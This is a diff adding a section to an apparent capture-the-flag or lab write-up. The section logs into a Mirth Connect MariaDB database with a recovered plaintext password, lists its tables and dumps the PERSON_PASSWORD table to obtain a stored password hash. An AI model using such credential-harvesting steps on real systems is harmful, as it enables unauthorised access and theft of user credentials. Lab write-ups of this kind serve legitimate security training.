@@ -123,6 +123,67 @@ LISTEN 0      128             [::]:22            [::]:*
 
 With this information, we connect to the SQL server using MariaDB:
 
+#### Connecting to database:
+
+We use the password: MirthPass123!
+
+```bash
+mariadb -h localhost -P 3306 -u mirthdb -p mc_bdd_prod
+```
+
+```bash
+show databases;
+use mc_bdd_prod;
+show tables;
+```
+
+#### Output:
+
+```
++-----------------------+
+| Tables_in_mc_bdd_prod |
++-----------------------+
+| ALERT                 |
+| CHANNEL               |
+| CHANNEL_GROUP         |
+| CODE_TEMPLATE         |
+| CODE_TEMPLATE_LIBRARY |
+| CONFIGURATION         |
+| DEBUGGER_USAGE        |
+| D_CHANNELS            |
+| D_M1                  |
+| D_MA1                 |
+| D_MC1                 |
+| D_MCM1                |
+| D_MM1                 |
+| D_MS1                 |
+| D_MSQ1                |
+| EVENT                 |
+| PERSON                |
+| PERSON_PASSWORD       |
+| PERSON_PREFERENCE     |
+| SCHEMA_INFO           |
+| SCRIPT                |
++-----------------------+
+```
+
+#### Password extraction:
+
+```bash
+select * from PERSON_PASSWORD;
+```
+
+#### Output:
+
+```
++-----------+----------------------------------------------------------+---------------------+
+| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
++-----------+----------------------------------------------------------+---------------------+
+|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
++-----------+----------------------------------------------------------+---------------------+
+```
+
+
 <img src="Images/10-Database-Connect.png" width="600">
 
 Next, we enumerate the database and discover an encrypted password:
